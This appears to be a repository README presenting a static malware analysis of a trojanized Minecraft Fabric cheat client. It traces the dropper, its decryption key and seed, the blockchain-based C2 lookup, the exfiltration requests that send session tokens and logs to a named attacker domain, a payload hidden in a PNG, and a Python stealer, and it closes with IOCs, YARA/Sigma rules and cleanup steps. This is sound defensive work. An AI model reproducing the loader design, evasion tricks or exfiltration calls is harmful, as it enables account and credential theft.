# efn-client-1.2.0.jar: decompiled (⚠ MALWARE, read-only)

**Verdict: confirmed malicious.** The jar is a Minecraft 1.21.11 Fabric "hacked client" (`efn.lol`)
that carries an encrypted second stage. When the game starts, it steals the player's Minecraft
session (access token, UUID, username) and registers the victim with an attacker server. It then
downloads a portable Python runtime and runs a Python **info-stealer**. The cheat features are the
bait. The payload is a reusable malware-as-a-service loader: each build is stamped with an operator
`userId` and `tag`, and it also works as a standalone double-click jar.

> Analysis was static only. Nothing from the jar was executed, and no attacker server was contacted.
> The only live lookups were read-only queries of public Polygon blockchain state through public RPCs.
> Do **not** run this project. `runClient`/`runServer` are hard-disabled in `build.gradle`.

## Layout

| Path | What |
|---|---|
| `src/main/java` | Main jar, remapped intermediary → Yarn `1.21.11+build.6` (including Mixin targets and `@Shadow`s), decompiled with Vineflower 1.11.1 with Minecraft, Fabric API and libraries as context |
| `src/main/resources` | `fabric.mod.json`, mixin configs, assets, plus `assets/efn/data/runtime.dat` (**the encrypted payload**) |
| `libs/` | Jars that were nested in `META-INF/jars` (imgui, netty, fabric-api modules) |
| `stage2/src/main/java` | **Decrypted payload `net.efn.loader.*`**: strings de-obfuscated, junk code removed, members renamed. **It compiles.** |
| `analysis/` | Reproducible pipeline: `rebuild-stage2.sh` regenerates `stage2/` from the original jar (see below) |
| `detection/` | YARA, Sigma, and a read-only Windows check script |

Open the folder as a Gradle project (Loom 1.17.21, Gradle 9.7.1 wrapper, Java 21).

**Build status:**
- `:stage2:compileJava` passes: 8/8 classes. The `jar` task is disabled.
- `:compileJava` resolves Minecraft, Yarn, Fabric API and Litematica/MaLiLib. **347 errors remain in
  135 of 787 files.** These are decompiler losses of generic types (`Object cannot be converted to X`,
  invalid method refs). They don't affect reading or IDE navigation, and fixing them means hand-editing
  each file.

## Evidence the jar was trojanized after being built

- Zip entry times: every class is 2026-11-14 17:08, `fabric.mod.json` 17:37, `MANIFEST.MF` 17:47, and
  **`net/efn/agent/AgentInit.class` + `assets/efn/data/runtime.dat` 18:11**, an hour after the build.
- `net.efn.bootstrap.EfnNativeBootstrap` is a `PreLaunchEntrypoint` that nothing registers, and
  `net.efn.launcher.InstallNotice` is a complete double-click notice that nothing points at. That's
  consistent with the original `preLaunch` entry and `Main-Class` being repointed at the dropper.
- All 12 nested jars match their official Maven artifacts byte-for-byte (aside from Loom's generated
  `fabric.mod.json`). The payload was not hidden in a library.
- Whether the efn.lol developers did this or someone repacked their release isn't provable from the
  jar alone.

A cleaned, buildable version with the dropper removed, verified against the original bytecode, is at
[fxderico/efn-clean](https://github.com/fxderico/efn-clean).

## Infection chain

All names below are from `stage2/src/main/java` (renamed; originals are in `analysis/rename-map.txt`).

1. **Dropper: `net.efn.agent.AgentInit`.** It's registered as a `main` entrypoint in
   `fabric.mod.json`, so it runs on every game launch, and it's also the jar's `Main-Class`. On a
   background thread it:
   - reads `assets/efn/data/runtime.dat`;
   - decrypts it with an LCG keystream (seed `0x13579BDF`, ×1103515245+12345, byte `(s>>>16)&0xFF`)
     XORed with the key `5A 3C 71 0E 2D 44 19 67`;
   - writes the result to `%TEMP%\efn<random>\p.jar`, loads it in a `URLClassLoader`, and calls
     `net.efn.loader.LoaderInit.onInitialize()`;
   - silently swallows every exception.
2. **`LoaderInit` + `SessionAccess`: session theft.** `SessionAccess` walks
   `MinecraftClient → Session → getUsername/getUuid/getAccessToken` by reflection. It tries
   Mojang, Yarn **and** intermediary names (`class_310`, `method_1548`, `method_1674`, …), so it
   works under any mapping. `LoaderInit` then:
   - resolves the C2 (step 3) and calls `registerVictim` (step 4);
   - builds a base64 JSON context:
     `{mcInfo: b64({username, uuid, accessToken}), prefireId, userId, tag, domain, gameDir, mcUsername, mcUuid, env: "Fabric"}`;
   - spawns a **detached** `javaw.exe -cp p.jar net.efn.loader.RuntimeBridge <context>` with stdin
     `NUL`, working dir and log at `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\_spawn.log`. The
     folder name is chosen to look like a Windows component. Windows-only.
3. **C2 discovery: `RuntimeBridge.resolveC2Domain()` (EtherHiding).**
   - The domain is read from the Polygon blockchain via `eth_call` to contract
     `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a`, selector `0xce6d41de` (`getMessage()`).
   - It tries `polygon.drpc.org`, `polygon-bor-rpc.publicnode.com`, `1rpc.io/matic`,
     `api.zan.top/polygon-mainnet` and `rpc-mainnet.matic.quiknode.pro` in turn.
   - Fallback: `thisisafalsepositive.st`.
   - The operator can repoint every infection by sending one transaction. No domain to seize.
4. **Registration.** `POST https://<c2>/shard/prefireMc` with
   `{"sessionId": <Minecraft access token>, "userId": <operator id>}` returns a `prefireId`. Headers
   carry `X-Runtime-Env: jre-embedded` and `X-Edge-Cache-Revalidate: stale-if-error`, decoys that
   make it look like CDN traffic.
5. **`HttpTransport`.** A hand-rolled HTTP/1.1 client over raw sockets. Hostnames are resolved
   **only via DNS-over-HTTPS to `1.1.1.1` (`cloudflare-dns.com`)**, which bypasses the hosts file
   and local DNS filtering. TLS uses a **trust-all** `X509TrustManager`. It also spoofs a Chrome 131
   User-Agent and browser `Sec-Fetch-*` headers.
6. **Stage-3 download: `downloadPortableRuntime()`.** Up to 3 attempts to fetch
   `https://<c2>/cdn/v2/9f4e7a2c1b8d.png`, disguised as an image request. The real payload is in a
   custom PNG chunk of type **`hIds`**. It's zlib-inflated into a ZIP and unpacked into
   `NtProfileIndex\` as `python.exe` + `AppHost\main.py` (zip-slip-unsafe).
   `analysis/extract_stage3.py` unpacks such a PNG offline.
7. **Stealer.** Runs
   `python.exe AppHost\main.py -u <userId> --env Fabric --tag Default --mcInfo <b64> --prefireId <id>`,
   with output going to `_stealer.log`.
8. **Exfil of logs: `uploadLogsToC2()`.** Posts `<gameDir>/logs/latest.log` (up to 5 MB), the
   stager's own log, plus `java.version`, `os.name` and `user.name` to
   `https://<c2>/shard/submitMinecraftLog`.
9. **Second entry point: `ProcessRelay`.** If `p.jar` is run on its own, it relaunches itself
   detached (`-restarted`) and runs the same chain with `env: "DoubleClick"`. The payload is built to
   be spread outside this mod too.

Builder constants: `userId = dee6a29f-02c8-4ca4-b4fa-31a35a6fd876`, `tag = Default`.

> **What `main.py` steals is not observed.** It's downloaded from the C2 at runtime and I did not
> fetch it. The code calls it a "stealer", it gets the Minecraft token and game dir, and it runs as a
> full Python runtime. Assume browser passwords and cookies, Discord tokens and wallets, which is the
> usual payload for this family.

## Live C2 intel (on-chain, read 2026-11-23)

| | |
|---|---|
| `getMessage()` (current C2) | `thisisafalsepositive.st`, the same as the hardcoded fallback |
| Contract functions | `getMessage()` `0xce6d41de`, `setMessage(string)` `0x368b8772`, `owner()` `0x8da5cb5b` |
| Owner / operator wallet | `0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767` (vanity address), nonce 13, ~77.49 POL |
| Domain history | Needs an archive node or explorer API. See `setMessage` calls at polygonscan.com/address/0x9c0a507300fd902787bb193d80fca5ce6e1bff9a |

Re-check the current C2 at any time (read-only):
```sh
curl -s -H 'content-type: application/json' https://polygon-bor-rpc.publicnode.com \
  -d '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x9c0a507300fd902787bb193d80fca5ce6e1bff9a","data":"0xce6d41de"},"latest"],"id":1}' \
| python3 -c 'import json,sys;r=bytes.fromhex(json.load(sys.stdin)["result"][2:]);n=int.from_bytes(r[32:64],"big");print(r[64:64+n].decode())'
```

## Main client audit (`net.efn.client.*`, `com.example.client.mixin.*`)

Everything that loads code, spawns processes, opens network connections, or touches credentials:

| Area | Verdict |
|---|---|
| `net.efn.agent.AgentInit` | **Malicious dropper.** It's the only code that touches `runtime.dat` or loads classes dynamically. |
| `account.*` (alt manager) | Legit Microsoft device-code login using the official launcher client ID `00000000402b5328`. **However, it stores Microsoft refresh tokens in plaintext** in `config/efn/accounts.json`, which is long-lived account access sitting next to a stealer that knows `gameDir`. |
| `webhook.*` | Sends only to webhook URLs you configure (PlayerDetection, CoordSnapper, SpawnerAlerts). |
| `util/spotify/*` | Now-playing via WinRT media session (Windows), `osascript` (macOS) or `dbus-send` (Linux); lrclib.net for lyrics. |
| `StaffLiveModule` | Polls YouTube/TikTok live pages for staff handles. |
| `SkinChangeModule` | Mojang profile/session APIs. |
| `discord/DiscordIpc` | Local Discord rich-presence pipe only. |
| `proxy/ProxyChecker` | Tests user proxies by connecting to 1.1.1.1:443. |
| `addon/AddonManager` | Loads only Fabric `efn` entrypoints from other installed mods, with no remote loading. |
| `security/PayGuard` | Blocks `/pay` commands you didn't type, and warns "something on this PC" is sending payments. The client markets anti-malware protection while shipping a stealer. |
| 160 mixins | No hooks on `Session`, auth, or credential classes. Network mixins are cheat features (packet handling, proxies, name protect). |

I checked every network/process/reflection call site, but not all ~1,300 classes line by line.

## Reproducing

```sh
# tools in <work>/tools: vineflower 1.11.1, asm 9.7.1, javaparser-core 3.26.2,
#                        tiny-remapper 0.12.1 (fat), yarn 1.21.11+build.6 mergedv2 -> yarn.tiny
analysis/rebuild-stage2.sh ../efn-client-1.2.0.jar <work>     # decrypt -> strip LVT -> decompile -> fold -> rename
java -cp tiny-remapper-fat.jar analysis/RemapToYarn.java in.jar out.jar yarn.tiny <intermediary MC jar> <deps...>
```

- `StripDebug.java` removes the obfuscator's bogus `LocalVariableTable`s, which otherwise
  make Vineflower emit `this` as undefined locals.
- `StringFolder.java` is an AST de-obfuscator (JavaParser) with these passes:
  - folds `(char)(a±^b)`, `char[]`, and `StringBuilder` string construction;
  - removes opaque predicates only when provably side-effect-free;
  - undoes a Vineflower mis-merge of nested builders, checked against `javap` (two separate
    `new StringBuilder` instructions);
  - applies `rename-map.txt`.
- Its output was cross-checked against an independent sequential folder; there were no
  contradictions.

## Detection

| File | Status |
|---|---|
| `detection/efn_stealer.yar` | 5 rules: dropper jar, `AgentInit.class`, encrypted `runtime.dat`, stage-2 jar, stage-3 `hIds` PNG. **Tested:** all real samples match; the PNG rule was checked on a synthetic `hIds` PNG; **0 false positives** on 717 benign jars/PNGs (Minecraft, Fabric, Litematica, Maven cache). |
| `detection/efn_stealer_sigma.yml` | 4 rules: detached `javaw` stage, portable Python stealer, `NtProfileIndex` file activity, and C2 DNS. YAML/UUIDs validated, **not run against a real SIEM**. |
| `detection/Check-EfnInfection.ps1` | Read-only Windows check. Looks for staging dirs, dropped `p.jar`, running processes, infected jars in launcher instance folders, and EFN `accounts.json`. **Not executed**; PowerShell wasn't available in the analysis sandbox. |

## IOCs

```
efn-client-1.2.0.jar   sha256 581870564fa9e71c09a6824b39cc75ebbd81e3c3690f154b3ef6aa08a4bab40b
runtime.dat            sha256 6423460f35b3f63f024c5a24862620ec2619e25fdfdce4808e8981473e054441
decrypted p.jar        sha256 b9e5d53d59e44dfb81c2c10607b4faeb02090941cec90fbdfbcef9b109172692

Polygon contract       0x9c0a507300fd902787bb193d80fca5ce6e1bff9a  (getMessage 0xce6d41de)
Operator wallet        0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767
C2 domain              thisisafalsepositive.st   (current on-chain value and hardcoded fallback)
C2 paths               /shard/prefireMc  /shard/submitMinecraftLog  /cdn/v2/9f4e7a2c1b8d.png
Builder id / tag       dee6a29f-02c8-4ca4-b4fa-31a35a6fd876 / Default
Host artifacts         %TEMP%\efn*\p.jar
                       %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\{_spawn.log,_stealer.log,python.exe,AppHost\main.py}
Processes              javaw.exe -cp <p.jar> net.efn.loader.RuntimeBridge <base64 json>
                       javaw.exe -cp <p.jar> net.efn.loader.ProcessRelay -restarted
                       python.exe AppHost\main.py -u <id> --env ... --mcInfo ... --prefireId ...
Network                DoH GET https://1.1.1.1/dns-query?dns=... (SNI cloudflare-dns.com) from java/javaw
                       JSON-RPC eth_call to the Polygon RPCs above from java/javaw
```

## If it was ever run

If `NtProfileIndex\` or `%TEMP%\efn*\p.jar` exists, the stealer ran:

1. From a **clean** device, change the Microsoft account password. That revokes Minecraft sessions
   and the refresh tokens in `accounts.json`.
2. Change every password saved in browsers on that PC.
3. Log out all Discord sessions.
4. Move any crypto funds.
5. Delete the mod, `NtProfileIndex\` and `%TEMP%\efn*`.
6. Because the Python stage is fetched at runtime and can change, a reinstall of Windows is the safe
   option.
